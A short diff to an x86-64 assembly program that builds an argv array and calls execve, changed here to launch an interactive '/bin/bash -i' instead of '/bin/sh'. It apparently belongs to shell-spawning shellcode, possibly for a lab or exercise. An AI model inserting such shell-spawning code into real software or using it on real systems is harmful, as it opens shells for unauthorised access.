@@ -48,9 +48,11 @@ _start:
     syscall
     
     xor rax, rax
-    push rax ; argv[1] = null
+    push rax ; argv[2] = null
+    lea rax, [rel flag]
+    push rax ; argv[1] = "-i"
     lea rdi, [rel path] 
-    push rdi ; argv[0] = "/bin/sh"
+    push rdi ; argv[0] = "/bin/bash"
     mov rsi, rsp
     xor rdx, rdx ; envp = null
     mov rax, 59 ; sys_execve
@@ -71,5 +73,8 @@ text:
     db "dead beef can be binded with meat glue", 0x0A
 
 path:
-    db "/bin/sh", 0
+    db "/bin/bash", 0
+
+flag:
+    db "-i", 0
 
